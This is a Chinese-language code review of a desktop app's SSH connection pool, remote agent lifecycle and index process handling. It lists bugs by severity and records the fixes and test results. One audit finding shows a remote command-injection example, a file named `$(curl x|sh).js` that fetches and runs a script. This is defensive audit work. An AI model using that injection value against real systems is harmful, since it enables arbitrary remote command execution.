# SSH 模块全面审查（架构 / 整洁 / 完成度）

审查对象：`src/ssh/**`（约 2000 行）+ `src/remote/**`（约 1500 行），以及它们与 Rust `dieyun-core` 的交互面。
方法：逐文件读代码 + 交叉核对调用方（`src/gateway/**`、`src/session/**`、`src/main/**`）+ 路径用例实测 + 全量测试回归。

---

## 一、总体判断

**分层意图清楚，安全性下过功夫，但四本账一本都没平。**

好的部分（不是客套，都有具体落点）：

| 项 | 落点 |
|---|---|
| 命令拼装统一单引号转义 | `src/ssh/remote-path.js:85` `shellQuoteSingle`，git 侧另有 `gitShellQuote` |
| 复合脚本用 base64 过 shell，避开嵌套引号地狱 | `session-manager.js:594-598` `wrapBashScript` |
| 并发 exec 会串行化（sshd 的 Channel open failure 真会发生） | `session-manager.js:605-606` `execChain` |
| 「后台进程握着管道」用 exit-status 收尾，不等 channel close | `session-manager.js:642-666` + `src/exec-settlement.js` |
| 超时数字只有一处 | `src/core-rpc-timeouts.js`（本地/远端共用） |
| 路径白名单用例实测严密 | `../../etc/passwd`、`/wsX` 兄弟目录、`//etc`、`\etc`、`ssh://` 全拒 |
| 打包清单与 require 闭包逐项吻合（22 文件） | `src/remote/remote-pack-layout.js:20-71` |

**四本不平的账**（这是本次审查的主线）：

1. **连接引用计数**：`acquire` 与 `release` 用的 key 不是同一把，靠 `Math.max(0, …)` 把不守恒吃掉。
2. **远端 agent 引用计数**：每次 `ensureForTarget` 命中都 `+1`，只在「丢租约」时 `-1` → 单调增，唯一消费者还是死代码。
3. **远端进程存活**：pid 文件只写不校验；`active` 是个布尔，进程死了它照样为真。
4. **索引所有权**：一台机器上「谁该拥有 `<workspace>/.dieyun/index.sqlite`」靠 `fuser` 盲杀回答。

第 4 条最要紧——它和上一轮「每会话一个 worktree」的设计直接冲突，见 §3.3。

---

## 二、架构层：三个真问题

### 2.1 连接身份有两套口径（按路径 vs 按端点）—— **已收敛（见 §5 第 11 条）**

`connection-pool.js:6-9` 说「每个 host+remotePath 一条连接」（Scheme B），但：
- `getConnectedManagerForEndpoint`（`connection-pool.js:49-63`）允许**跨路径借用**端点上的任意已连 manager；
- 真正建立 TCP 连接的是 `ensureConnected`，按 `poolKeyForTarget` = `user@host:port|remotePath` 分槽。

于是同一个 SSH 端点可以同时存在「连着的槽」和「借用别人连接的槽」两种状态，而**引用计数只对有槽的那个有意义**。这是本轮我自己踩坑的直接原因（见 §5.1）。

**已做**：连接按**端点**唯一（`poolKeyForTarget = sshTargetKey`），remotePath 只是调用方属性。这样 acquire/release 天然对齐，`holdTarget`、跨路径借用、`disconnectTarget` 全部消失。

### 2.2 生命周期是隐式状态机，没有代次

`remote-gateway-manager.js` 用 `active`(77) / `deploying`(78) / `remoteWorkspace`(73) / `activeRemotePort`(74) / `lastSshManager`(80) 五个变量互相推断状态。两个后果：

- **start 进行中来了 stop**：`stop()`（`:98-115`）完全不看 `deploying`，而 `deploying` 的 `finally`（`:756-758`）只清标志。在飞的 `ensure` 会继续跑到建隧道、`active = true`，但 pool 里那条 entry 已经 `delete` 了 → 没人能停它。远端 agent 活着、本地端口在听，直到服务器重启。
- **进程死了 active 仍真**：早退判据 `manager.js:671-678` 比较 `remoteWorkspace`/端口，而 manager 与 `sshGatewayKey` 一对一，这个比较恒真 → 退化成单看布尔 `active`。且全仓**没有任何调用方设置 `ctx.force`**（`main/remote-gateway.js:44-48` 不返回、IPC 不传），所以「重启」既没探测也没入口 → 自愈链 `reconnect.js:215-302` 拿回一份陈旧 info 并报 `ok=true`，用户只能手动断开 SSH。

**已做（比相位枚举更小）**：单调 epoch + 单点提交；每个 await 之后校验自己的 epoch 还是最新的，过期即回滚（自己收掉隧道与远端进程）。没有引入七态枚举 —— 删掉 `force` 与「按 target 比较」之后，剩下的状态只有「有没有 active 槽」和「epoch 是不是自己的」，用布尔表达是准确的。活体不再靠 `active`，而是 TCP 探测本地隧道端口。

### 2.3 四套「独占」机制并存，其中一套是盲杀

| 机制 | 作用域 | 位置 | 评价 |
|---|---|---|---|
| `withEndpointDeployLock` | 进程内，按端点 | `deploy-lock.js:33-46` | 好，注释也写了来历；但注释声称的「跨项目不互删」只对同进程成立 |
| `execChain` | 连接内串行 | `session-manager.js:606` | 必要（sshd 真会 Channel open failure） |
| `_killStaleIndexHolders` | **跨进程，靠 SIGTERM 别人的 PID** | `remote-index-core.js:164-195` | **危险**，见下 |
| （计划中）flock | 跨进程，咨询锁 | 计划文档 §8 | 与上一行功能重叠 |

`_killStaleIndexHolders` 的问题：`fuser <index.sqlite>` 拿到持库 PID 后直接 SIGTERM，只跳过 `process.pid`，**不校验这个进程是不是 dieyun-core、是不是本会话的**。在「两个会话共享同一远端工作区」的历史形态下，这就是互杀——一个会话启动索引时把另一个会话的 core 干掉，对方再重启再反杀，正是原事故「实例越重连越多、core 反复死」的加速器。`fuser` 还会顺带杀掉 sqlite3 CLI、备份脚本等临时持有者。

worktree 隔离之后（每会话独立 DB）这个函数只在「清理孤儿」这一个正当场景生效。**已做**：只杀「cmdline 含 dieyun-core **且** ppid≤1（孤儿）」的进程；有监督者的 core 一律跳过。flock（计划文档 §8 的 C3）仍值得做，那是跨实例的正式仲裁，本函数只是收尸。

---

## 三、按严重度的问题清单

### 3.1 阻断

**B1｜远端 LSP 兜底把 `JSON.stringify` 当 shell 转义 → 远端任意命令执行**（已修，见 §5.6）
`src/lsp/cli-fallback.js:1188/1229/1268` 把文件相对路径塞进 `npx ... ${JSON.stringify(rel)}`。JSON 只给双引号，双引号里 `$(...)`、反引号、`\` 仍由远端 shell 解释。一个名为 `$(curl x|sh).js` 的文件（仓库里可被 clone/生成）即等于以 SSH 用户身份在远端执行任意命令，且这条链路走 `sshExec`，绕开 ask-once 审批。本地同引擎走 `spawn` argv（`cli-fallback.js:39`），没有这个问题——纯远端侧漏洞。

**B2｜`ssh:connect` 在 SSH 已经连成功后仍整体报失败**
`src/main/ipc/workspace-remote.js:187-216` 的 try 只包住 connect，`:218` 的 `saveProfile` 在 try 之外；`credentials-store.js:86-98` 在「无法加密」或「key 认证无 passphrase」时抛错，而 `session-manager.js:296` 里 passphrase 本来是可选的。触发条件：私钥认证 + 不填 passphrase + 勾「记住」→ 每次连接都报失败，但连接其实是通的。

### 3.2 严重

| # | 问题 | 证据 | 影响 |
|---|---|---|---|
| S1 | 连接 acquire/release 的 key 不一致 | `session-remote-transport.js:188-190`、`connection-pool.js:172-203` | 连接永不回收；`evictIdle`/`evictOverCap` 全跳过 refCount>0；`ssh:disconnect` 非 force 被拒 |
| S2 | 三处 `acquire` 未 await，其中一处 try/catch 抓不到 rejection | `session-remote-transport.js:215/238/243` | unhandled rejection（Electron main 默认会崩） |
| S3 | 借用分支不持引用 | `session-remote-transport.js:218-223` vs `connection-pool.js:109-126` | 会话正在用的连接可能被 over-cap 回收 |
| S4 | 同一 manager 并发 connect 互撞 | `connection-pool.js:156-166`、`session-manager.js:304`（connect 先 disconnect，会对 pending 调 abortConnect） | 手动连接 + 2500ms 自动重连同时发生 → `SSH_CONNECT_ABORTED` |
| S5 | 凭据非原子写、解密失败静默返回空串 | `credentials-store.js:30-33`、`:22-28`、`:43-52` | 崩溃一次可能覆盖掉整份凭据；keychain 变更被误报成「密码缺失」 |
| S6 | 远端 agent 崩溃后无探测、无 force 入口 | `remote-gateway-manager.js:671-678`；`ctx.force` 无生产者 | 自愈链空转，UI 层无法恢复（只能断 SSH） |
| S7 | `RemoteAgentClient.connect()` 没有超时 | `remote-agent-client.js:124-177`，计时器在 `:194` 之后才注册 | 隧道对端不是我们的 ws 服务时，RPC 永久挂起，三次重试全卡在 connect |
| S8 | 端口分配纯进程内 + 启动前「杀端口」 | `remote-gateway-pool.js:15-23`、`remote-gateway-manager.js:605-606` | 另一台机器/另一用户/残留实例连同一 endpoint 必然撞 17331，后者 `fuser -k` 静默杀前者 agent；前者 `active` 仍真，只看到 auth 失败 |
| S9 | 就绪探测只证明「端口有人在听」 | `manager.js:641-651`（`ss/netstat`）、`:484-501` | 撞车窗口里把「别人的监听」当启动成功；真正的错误延后到第一次 RPC |
| S10 | `stop()` 用未确认的 `activeRemotePort` 兜底 | `manager.js:74/105/737` | 一个「没起来的槽」调 stop 会去杀同端点第一个槽的 agent |
| S11 | ensure 失败路径不回收已启动的远端进程 | `manager.js:711-714` vs `:747-755`（catch 不 stop） | 孤儿进程持有 `index.sqlite`，是锁争用的直接来源；退出时也不收（`stopAll` 无调用方） |
| S12 | 远端 memory 库落进项目目录，且 configure 失败会让索引整体不可用 | `remote-index-core.js:206`（`data_dir=<ws>/.dieyun`）+ Rust `rpc/mod.rs` 里 `MemoryStore::from_config(...).unwrap_or_else(panic!)` | 每个远端仓库被写入 `diecloud-memory.sqlite(+wal/shm)`；工作区只读/满盘 → 索引全废，尽管 codebase/graph 不需要 memory |
| S13 | 错误码在 client 边界被丢 | `remote-agent-client.js:163`（只留 message） | `REMOTE_INDEX_CORE_MISSING` 等全变字符串，上层只能中文正则猜 |
| S14 | 「命令失败」被折成「成功/空结果」4 处 | `session-manager.js:666`（无 exit-status → code 0）、`rpc.js:1162-1185`（glob 不查码）、`rpc.js:1797-1803`（脚本带 `\|\| true`）、`git-target.js:224-230`（`textOrEmpty`） | 空结果与失败无法区分，Agent 会以为「文件不存在 / 没引用」 |

### 3.3 一般

- ~~**远端索引在 SFTP 写入后不会增量更新**~~ → **已修（P2）**：桌面端 SFTP 写成功后 fire-and-forget `index.notify_change`，远端用与 `fs.write_file` 同一份规则调度增量。原文：本机有 watcher + 增量调度器（`src/index/codebase-incremental-scheduler.js`、`src/graph/graph-incremental-scheduler.js`），而远端增量只挂在**远端 host 自己的** `fs.write_file` 上（`minimal-gateway-host.js:213-216`），桌面端写文件却走 SFTP（`gateway/remote-fs.js`）→ 那条路径永远不触发。`_syncWorkspaceIndexWatch` 对远程也直接 return（注释写「由远程 agent 侧负责」，但负责的那条路没被走）。Rust core 本身**没有文件监听器**（`crates/dieyun-core/src` 全库无 notify/watcher），所以不会自愈。表现为：同一回合内写完文件再 `codebase_search`，结果陈旧。
- ~~**远端 host 有 8 个 `fs.*` handler 桌面端从不调用**~~ → **已修（P4）**：桌面端的远端读写现在经 `createRemoteAgentFsAdapter`（RPC 走 SSH 通道）落到这些 handler 上，`codebase.grep` 这个重复实现已删（见 §11）。原文：真实读写走 SFTP，这些是**影子实现**，且增量调度就挂在它们身上。
- ~~**双 grep 实现**~~ → **已删（P4）**：只留 `fs.grep`（rg-search，远端没 `rg` 时它自己退 GNU grep）；自拼 grep 的 `codebase.grep` 与桌面端两层兜底一并删除。原文：`codebase.grep`（`minimal-gateway-host.js:318-363`）与 `fs.grep`（走 rg-search）功能重叠，前者还被当兜底（`rpc.js:1214-1218`）。
- 远端输出无上限累积（`session-manager.js:643-646`），本机 `runShell` 有 512KB~2MB 上限（`host-control.js:542,589-591`）。
- 远端命令不可中断，超时只 `stream.close()`，且上限夹在 180s（`session-manager.js:610,614-634`）。
- `applyConfigure` 重配置失败不清 `started`（`remote-index-core.js:295-304`）→ core 带旧配置继续跑且不再 configure；与首配失败路径（`:250-265`）语义不一致。
- ~~glibc 预检在 spawn **之前**（`linux-elf-compat.js:82-91`）：Alpine/musl 或无 `ldd` 时直接判不兼容，不给二进制一次运行机会；且 `maxGlibcInBuffer` 全文件扫字面量可能造假高版本。~~ → **已删（P3）**：整套运行时预检（`linux-elf-compat.js`、`hostGlibcVersion`、`index.ping.incompatible`）消失，改成产物侧硬约束 `assertCoreGlibcTarget()`：远端 core 用 `cargo zigbuild --target …gnu.2.17` 构建，打包时精确解析 `.gnu.version_r`（只认 libc 家族），高于 2.17 直接打包失败（见 §12）。
- 打包完整性只验 `node_modules/ws/package.json` 存在（`remote-pack-layout.js:64`），且 hash 由同一份清单算 → 新增 require 忘加清单时 hash 不变、不重传、远端 require 才崩。
- 内部钩子暴露成 RPC：`__warmupRemoteIndex` / `__disposeRemoteIndex` 挂在 handlers 表上（`minimal-gateway-host.js:408/419/563`），分发无前缀白名单。
- index/graph 方法不校验 `workspaceRoot` 白名单（`remote-index-core.js:341-347`；Rust 侧 `assert_allowed_path` 只被 fs_ops 用）→ 持 token 者可让远端 core 索引/检索任意目录。本地 gateway 同一形状（共享缺陷）。
- 远端 worktree 永不回收：全仓无 `worktree remove/prune`（本地有 `pruneRunBranches`）。会话攒多了 `~/repo/.dieyun/worktrees/` 会长草。
- 隧道关闭不销毁已接受的 socket（`tunnel.js:49-58,200-209`）；两套隧道实现并存（`remote-gateway-manager.js:721-732` 自建 vs `port-forward-manager.js:31-56`）。
- `pickFreeLocalPort` 先探后绑有 TOCTOU 且无重试（`manager.js:653-664`）；`port-forward-manager.js:112-135` 反而有重试。
- token 用 `===` 比较，非常量时间（`minimal-gateway-host.js:542`）；只有 127.0.0.1 监听，风险低。

### 3.4 完成度：远端到底支持什么，没有单一来源

远端网关实际暴露 **34 个方法**（P2 加 `index.notify_change`、P3 删 `agent.ping`，仍为 34），本地 RPC 目录是 **197 个**（≈15%）。缺的部分（scm / browser / undo / memory / compaction / planner / web / speech / computer / `host.proc_*` / `graph.lsp_resolve|lsp_enrich`）从调用方看**是有意分工**（桌面侧用 ssh exec / SFTP / 本机实现兜住），但：

- `minimal-gateway-host.js` 顶部没有一句「本网关的能力边界」；
- `src/remote/*` 与 `src/ssh/*` 里 **TODO/FIXME 数量为 0**——缺口全是「静默半成品」（只写不读的字段、无人调用的函数、没有调度的 TTL），比有标注的更难发现。

**建议（未做）**：在 `minimal-gateway-host.js` 顶部写 10 行能力边界（支持什么 / 为什么其余不支持 / 各自替代路径），并把它作为新增方法时的必读。

### 3.5 死代码与重复实现

死代码（P3 已清掉下面标注 ~~删除线~~ 的项，其余仍留着）：

| 项 | 位置 |
|---|---|
| ~~`pool.stopAll`~~ → 已接到 `before-quit`（退出顺手收远端 agent） | `remote-gateway-pool.js` + `main-entry.js` |
| ~~`pool.stopExceptGatewayKeys`~~（已删除） | `remote-gateway-pool.js` |
| ~~`disconnectExceptEndpointKeys`~~（已删除） | — |
| `evictIdle` 只在 `release()` 末尾触发，没有定时器（不释放就没机会回收） | `connection-pool.js` |
| `checkSystemNode` / `source:'system'` 分支不可达 | `remote-gateway-manager.js:404-421,460-464` |
| ~~`gateway-<port>.pid` 只读不写~~（已删；`agent-<port>.pid` 改 `ps -p … -o command=` 验身份） | — |
| ~~`agent.ping`~~（已删；活体探测改成 TCP 探测隧道端口，比进程内 ping 更能证明「隧道 + 监听」都在） | — |
| `INDEX_RPC_TIMEOUT_MS` / `DEFAULT_REMOTE_RPC_TIMEOUT_MS` 死常量 | `rpc.js:422,432` |
| `connecting` 只写不读（被放弃的 connect 去重；P0 之后超时由 `remote-agent-client` 管，这里只是残留） | `session-manager.js` |
| `isEndpointLeased` / 租约 `refCount` 字段 | `session-remote-transport.js:63-69,190` |
| `lastOkAt` / `lastErrorAt` 只用于展示 | `manager.js:741-751` |

重复实现（同一概念多处）：

| 概念 | 出现在 |
|---|---|
| `user@host:port` 拼装 | `workspace/target.js:141-146`、`deploy-lock.js:21`、`workspace-remote-runtime.js:14-16`、`connection-pool.js:322-342`、`credentials-store.js:18-20`（另一种顺序） |
| 端点比较 | `target.js:133-138`、`connection-pool.js:322-342`、`reconnect.js:64-70`、`session-remote-transport.js:52-61`、`gateway/server.js:430,436` |
| 「已连接」判定 | `connection-pool.js:49-79,110,156,311,336`、`session-remote-transport.js:150,220,236`、`reconnect.js:84,123`、`gateway/server.js:423-437`、`workspace-remote.js:416-427` |
| 池管理器查找 | 已收敛为 `getConnectedManager() \|\| getManagerForTarget()`（P3） |
| 凭据 → connect payload | `auto-reconnect.js:42-66`、`workspace-remote.js:167-185` |
| 池实现（同构两套） | `connection-pool.js:93-126,218-254` vs `remote-gateway-pool.js:47-84,86-149` |
| ~~grep~~ | 已删重复实现（P4：`codebase.grep` 自拼 GNU grep 移除，只留 rg-search 那份） |
| shell 单引号转义 | `remote-path.js:85` vs `git-target.js:34` |
| 错误码命名（三种拼法） | `SSH_INVALID_TARGET` / `INVALID_SSH` / `REMOTE_GATEWAY_INVALID_TARGET` |

---

## 四、与 Rust 核心交互的三个脆弱点

1. ~~**`data_dir` 双来源**~~ **已修**：spawn 的 env 与 `core.configure` 现在都取同一个 `this.runtimeDataDir`（`$HOME/.dieyunagent`），项目里只留 `index_db_path`。以前 spawn 给 `$HOME`、configure 又改成 `<workspace>/.dieyun`，中间夹着 Rust「路径变了就重开 memory 库」，等于记忆库落点每次启动都可能搬家。
2. **`index_db_path` 与进程清理策略耦合**：Rust 打开的库文件，Node 侧同时用 `fuser` 杀掉持有者。库路径语义和「谁能活着」绑在一起，其中一半是盲杀。
3. **方法名闭包**：`INDEX_RPC_METHODS`（`remote-index-core.js:18-35`）必须与 Rust `dispatch` 逐字对齐，否则「网关以为有、远端没有」只在运行期炸（`:334-338` 的 `REMOTE_INDEX_UNSUPPORTED` 是唯一防线）。另：Rust 侧**没有 SIGTERM 处理器**（全 crates 无 ctrl_c/SIGTERM），而 `core-bridge.js:57-62` 假设「SIGTERM 之后有 5s 优雅退出、再 SIGKILL」——那个 5s 台阶对 Rust core 实际不存在，SIGTERM 就是立即杀，日志里看到的 `SIGKILL` 往往是下一轮才到达。

---

## 五、本轮已修（均带测试）

| # | 修了什么 | 为什么 | 文件 |
|---|---|---|---|
| 1 | ~~租约里存 `holdTarget`~~ → **P3 已删**（连接按端点唯一后 acquire/release 天然同键） | 上一轮是补丁：acquire 用仓库根 key、release 用 worktree key → refCount 只增不减 | `session-remote-transport.js` |
| 2 | 三处 `acquire` 全部 `await`，去掉抓不到 rejection 的 try/catch | unhandled rejection 风险；`catch` 是死代码 | `session-remote-transport.js:217-256` |
| 3 | 建 worktree 不再用 `-B` 重置同名分支；分支已存在改为 attach；基线解析失败明确报 `WT_BAD_BASE` | `-B` 会把分支重置回基线，**丢掉上一次会话的提交**；静默退回 `HEAD` 会让「相对基线的变更」失去确定含义 | `remote-worktree.js:82-99` |
| 4 | 应用回主目录：只有真有未合并路径才报冲突；副本不在自己分支上直接拒绝 | 原来任何合并失败都报「冲突」并列出主目录原有脏文件；副本 detached 时提交进不了分支，merge 会「成功但什么都没合」 | `remote-worktree-apply.js:104-130` |
| 5 | 远端 LSP 兜底：`JSON.stringify` → `shellQuoteSingle` | B1 的远端任意命令执行 | `cli-fallback.js:1188/1229/1268` |
| 6 | status 调用超时 20s → 45s（12 处） | 远端最坏 15s + 0.3s + 15s = 30.3s，20s 会把远端包装好的真实错误截成「客户端超时」 | `handlers/graph.js`、`handlers/codebase.js`、`rpc.js:1500` |
| 7 | 会话身份回到「项目」：`stripWorktreeSuffix` / `projectWorkspacePath`（`workspace/target.js`），`memory.sessions_list` 输出 `workspaceProjectPath`，历史分组、composer 标签、自动化工作区下拉都按项目走 | worktree 是「写到哪儿」不是「在哪个项目」。上线首日的历史列表把同一项目拆成多个名为 `main` 的文件夹 | `workspace/target.js`、`gateway/handlers/memory.js`、`gateway/server.js:_workspaceView`、`renderer-chat-history.js`、`renderer-automation.js`、`ssh/remote-worktree.js`（`repoRemotePathOf` 改为复用同一份形状判定） |

| 8 | **P0 三连**：`ssh:connect` 的 `saveProfile`/`clearProfile` 降级为 best-effort（连上就返回 `connected:true` + `credentialsWarning`）；`remote-agent-client.connect()` 加 15s 握手超时（`REMOTE_AGENT_CONNECT_TIMEOUT`）；`_killStaleIndexHolders` 只杀「cmdline 含 dieyun-core 且 ppid≤1」的孤儿 | 三个「假失败 / 永久挂起 / 互杀」根因，各 3–10 行 | `main/ipc/workspace-remote.js`、`gateway/remote-agent-client.js`、`remote/remote-index-core.js` |
| 9 | **P1 生命周期**：`epoch` + 单点提交 + 每个 await 后 `assertFresh()`；活体改 TCP 探测（`probeTunnelAlive`）；删掉**没有生产者**的 `force`；`stop()` 先提 epoch 再收隧道/远端进程；`gateway-<port>.pid`（只读不写）删除；`agent-<port>.pid` 用 `ps -p … -o command=` 验身份再杀 | 「部署中被 stop → 僵尸槽」「僵尸槽被当活槽复用」「盲杀 pid 文件」 | `ssh/remote-gateway-manager.js`、`ssh/remote-gateway-pool.js`、`session/session-remote-transport.js` |
| 10 | **P2 远端索引新鲜度**：新增远端 `index.notify_change`（判定与 `fs.write_file` 共用 `scheduleIndexForChange`），桌面端 SFTP 写完 fire-and-forget 通知 | 桌面端写入不经过远端 `fs.write_file`，远端索引永远停在旧内容 → 远端 grep / 图谱照着旧代码答 | `remote/minimal-gateway-host.js`、`gateway/handlers/fs.js` |
| 11 | **P3 连接身份 = 端点**：`poolKeyForTarget = sshTargetKey`；删 `getConnectedManagerForEndpoint`（借用）、`disconnectTarget`（与 `disconnectEndpoint` 合并）、`disconnectExceptEndpointKeys`、`listTargetKeys`、`lastConnectedKey`、`holdTarget`、`stopExceptGatewayKeys`；`stopAll` 接到 `before-quit`（退出顺手收远端 agent）；UI 连接补 `holdEndpoint`（幂等最小引用，别被 idle 回收）；租约加 `acquired` 标记（没记过引用就不许 release） | 一条连接被复制成 N 份后，refCount / 该断谁 / 谁在用的是判断题；且退出时远端 agent 变孤儿 | `ssh/connection-pool.js`、`ssh/remote-gateway-pool.js`、`session/session-remote-transport.js`、`main/ipc/{workspace-remote,worktree}.js`、`gateway/server.js`、`ssh/reconnect.js`、`main-entry.js` |
| 12 | **P4 memory 库出工作区 + embedding 配置面补齐**：`core.configure` 的 `data_dir` 改用 `runtimeDataDir`（`$HOME/.dieyunagent`），与 spawn env 同源；`index.configure` 补 `headers`/`authMode` | 项目目录只该有 `index.sqlite`；缺 `headers`/`authMode` 时远程嵌入只能靠 apiKey 硬拼，自定义头全丢 | `remote/remote-index-core.js`、`gateway/rpc.js` |

回归：`npx vitest run` **1142 passed / 116 files**；`npm test` OK；`npm run check:js` 干净；`check:renderer` OK；`verify:rpc-catalog` OK；`test:local-gateway-smoke`、`test:phase5-handlers-smoke`、`test:session-remote-transport`、`test:ssh-reconnect-targets`、`test:workspace-remote-runtime` 全过。

> 注意：在本机 Electron 宿主里跑测试时 `ELECTRON_RUN_AS_NODE=1` 会污染子进程环境，导致 `test:lsp` 报 `npx child keeps default env` 假失败。跑之前 `$env:ELECTRON_RUN_AS_NODE=$null`。

---

## 六、修复顺序（P0–P4 已完成，见 §5）

| 优先级 | 事项 | 状态 |
|---|---|---|
| **P0** | `saveProfile` 降级 best-effort；`connect()` 加超时；`_killStaleIndexHolders` 加归属校验 | ✅ 已做（§5-8） |
| **P1** | epoch + 单点提交 + 活体探测；`force` 直接删掉（无生产者） | ✅ 已做（§5-9） |
| **P2** | 远端索引新鲜度：SFTP 写后通知远端增量 | ✅ 已做（§5-10）；真远端验收仍待做 |
| **P3** | 连接身份收敛到「端点唯一」+ 删死代码 + `stopAll` 接到退出 | ✅ 已做（§5-11） |
| **P4** | memory 库挪出工作区 + embedding 补 `headers/authMode`（`modelsDirs` 属远端本机路径，语义不成立，未传） | ✅ 已做（§5-12） |
| **P5** | 结果语义：未知退出码 ≠ 成功、失败 ≠ 空、错误码/建议过隧道 | ✅ 已做（§8）；可取消、单侧 handler 清理、双 grep 收敛未做（见 §8.4） |

仍待办（都需要真远端验收，离线跑不出结论）：

- C3：`flock -n -E 42` 启动器 + `agent-<port>.pid` 存活校验 —— 跨实例的正式仲裁；现在的「孤儿收尸」只是兜底。
- 真远端验收：两个会话 → 两份 worktree / 两个 `index.sqlite` / 不互杀；`stopAll` 退出后远端无残留 `run-cli.js`。
- 单侧 handler 清理（§3.4）：远端 `fs.write_file/edit_file/mkdir/list_dir/stat/delete_file` 在生产链路里没有调用方（桌面端走 SFTP），要么删，要么在文件头写明「供 CLI/测试直连用」，别让下一个人以为有两条写路径。
- P2（per-host 单 daemon + Unix socket）、P3（静态自包含二进制分发）、P4（RPC 走 SSH channel 收敛写路径）—— 见 §9。

---

## 七、P1 认证面改造（已实施）

### 7.1 为什么动

改造前只有一条路：手输 IP + 手输用户名 + 密码或单个私钥文件。缺的全是「2020 年代 ssh 用户默认就有」的东西：

| 缺什么 | 后果 |
|---|---|
| ssh-agent | 每台机器都要把私钥落到某个路径再让应用读，CI / 1Password / YubiKey 的形态全不成立 |
| keyboard-interactive | 把 `PasswordAuthentication no` + `KbdInteractiveAuthentication yes` 的发行版默认直接判死（服务器只允许 kbd，而我们只发 password） |
| ProxyJump / ProxyCommand | 内网主机（只经跳板可达）连不上 |
| `~/.ssh/config` | 别名、非 22 端口、`IdentityFile`、`User` 全要用户手抄；抄错只能得到「认证失败」 |
| 认证顺序 | ssh2 默认 password → publickey，与 OpenSSH 相反：密码先试会白吃服务器的 `MaxAuthTries` |

### 7.2 改成什么（单一来源）

| 关注点 | 唯一来源 | 说明 |
|---|---|---|
| 配置解析 / 别名解析 | `src/ssh/ssh-config.js` | 纯解析：Host 通配 + `!` 取反、`Key=Value`、引号、`Include`（含环保护）、`ProxyJump`。每个参数**第一个匹配到的值生效**（OpenSSH 语义）；`IdentityFile` 可叠加。`Match` 块整体忽略（猜错语义比不应用更危险） |
| 认证方式装配 | `src/ssh/auth-methods.js` | agent 探测（POSIX `SSH_AUTH_SOCK` / Windows `\\.\pipe\openssh-ssh-agent`）、有序 authHandler（none → agent → 私钥（可多把）→ kbd → password）、kbd 应答边界 |
| 跳板链 | `src/ssh/proxy-jump.js` | 逐跳 `forwardOut` 串接；任一跳失败把已建立的连接全部拆掉 |
| 「连接意图 → 有效参数」 | `src/ssh/connect-payload.js` | 手动连接（IPC）与自动重连（`auto-reconnect.js`）共用；解决 §3.5 那条重复实现 |
| 连接建立 | `src/ssh/session-manager.js` | 只消费有效参数：`hostname` 建 TCP、`host`（别名）作身份、`methods` 作认证链 |

优先级（从高到低）：**显式输入 > 已存凭据 > `~/.ssh/config`**。端口是唯一例外：UI 的 22 是默认值而不是用户选择，config 里写了别的就按 config 走；用户真要 22 就显式再输一次（无法区分，已在文档写明）。

known_hosts 按**实际地址**（`HostName`）记账，别名只是入口 —— 换别名不该重新 TOFU 一次，与 OpenSSH 一致。

### 7.3 明确不做（并给出可读错误）

- **一次性验证码 / 多问 kbd**：需要人机往返，本客户端代答不了。现在会带着 `SSH_NEEDS_INTERACTIVE_PROMPT` + 提问原文失败，而不是笼统的「认证失败」。
- **跳板机密码**：跳板只支持 agent / config `IdentityFile`，缺则 `SSH_JUMP_NO_AUTH`。
- **ProxyCommand**：要执行任意本地命令，不做；解析出来只给一条 `warnings` 提示改用 ProxyJump。
- **agent 钥匙数量**：agent 里的钥匙由 ssh2 逐把尝试，钥匙很多时可能吃完服务器的 `MaxAuthTries`（与 OpenSSH 同病）。用户亲手填了密码时，密码**优先**，不给 agent 白吃配额。

### 7.4 测试

`test/unit/ssh-config.test.cjs`（15）、`ssh-auth-methods.test.cjs`（15）、`ssh-proxy-jump.test.cjs`（6）、`ssh-connect-payload.test.cjs`（21），外加既有的 `ssh-connect-credentials` / `ssh-pool-endpoint-key` / `session-lease-refcount`。
回归：`npx vitest run` 1226 passed / 124 files；`npm test` OK；`check:js`、`check:renderer`、`test:session-remote-transport`、`test:ssh-reconnect-targets`、`test:workspace-remote-runtime` 全过。

---

## 八、P5 结果语义（已实施）

一句话：**「不知道」不许被写成「成功」，也不许被写成「空」。**

### 8.1 三处「未知 ⇒ 成功」

| 位置 | 原写法 | 后果 |
|---|---|---|
| `ssh/session-manager.js` `execRawOnce` | `code: r.code == null ? 0 : r.code` | 通道在命令中途断掉（一个 exit-status 都没收到）时补成 0 → 半截 stdout 被当成功输出 |
| `git/git-target.js` `run` | `safeCode = Number.isFinite(code) ? code : 0` | 第二次把 `null` 洗成 0（`Number(null) === 0`）；`ok: true` + 空 stdout → 「工作区是干净的」 |
| `git/git-target.js` `pathExists` | `Number(r.code) === 0` | `null` → `0` → 「路径存在」；上层接着去读一个不存在的文件 |

现在：`exec` 是唯一判定点，拿不到 exit-status 就 **reject**（`SSH_EXEC_UNKNOWN_STATUS`，附 `settledBy` 与已收输出，`retryable: false` —— 写操作可能已生效，盲目重跑比不跑更危险）。`exec-settlement` 本来就如实返回 `code: null`，问题出在消费端擅自补 0；补 0 的地方全删掉，`git-target` 只透传。

### 8.2 「失败」被写成「空」

- `git/git-target.js` `readText`：`head -c N -- file 2>/dev/null || true` 把「文件不存在」「无权限」「确实是空文件」压成同一个 `''`。改成 `if [ -e … ]; then head …; else exit 44; fi`：44 → 抛 `ENOENT`，其它非 0 → 抛 `EIO` 并带远端 stderr。两个调用方（`diff-context` / `scm-service`）本来就 `try/catch` 兜成空 —— 语义不变，但**要不要当空由调用方显式决定**，与本地目标一致。
- `gateway/rpc.js` 远程搜索调用方：`rg … || true` / `grep … || true` 把「没匹配(1)」「没装/权限/路径错(≥2)」全压成 0，于是下面那条 `code !== 0 → 上报错误` 的分支**永远走不到**（死代码）。改成保留 `rc` 并 `case $rc in 0|1) exit 0;; *) exit $rc;; esac`，错误分支现在真的会亮，并带 `REMOTE_RG_EXIT_<code>`。
- `gateway/rpc.js` `execRemoteGrepForCallers`：`catch { return null }` 把「超时 / 命令失败」说成「没连接 / 没权限」（`remote_exec_unavailable`）。现在三态分明：`null` = 这条道走不通（可以退下一层）／`{error}` = 命令真失败（原样上报）／`{code,stdout}` = 查询成功。

### 8.3 错误码与建议不许在隧道口蒸发

失败契约是 `code / retryable / suggestedFix` 三件套（`agent/tool-harness.js` 直接读后两个决定能不能重试）。三处信封原来只留 `{code, message}`：

- `gateway/server.js`（本地 WS 回包）
- `remote/minimal-gateway-host.js`（远端进程 → 隧道）
- `gateway/remote-agent-client.js`（隧道 → 本地）

